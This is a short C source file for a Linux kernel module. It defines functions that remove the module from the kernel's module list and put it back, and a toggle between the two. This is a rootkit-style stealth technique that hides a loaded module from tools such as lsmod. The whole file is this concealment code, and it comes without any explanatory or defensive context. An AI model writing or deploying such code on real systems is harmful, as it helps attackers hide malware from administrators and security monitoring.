#include <linux/module.h>

int hide_m = 0 ;
static struct list_head * prev_module ;
void showme(void){
   list_add(&THIS_MODULE->list , prev_module);
   hide_m = 0 ;
}
void hideme(void ){
 prev_module = THIS_MODULE->list.prev ;
 list_del(&THIS_MODULE->list);
 hide_m = 1 ;
}
void hide_module (void ){
     if(hide_m == 0){
          hideme();
     } else if (hide_m == 1){
              showme();
     }

}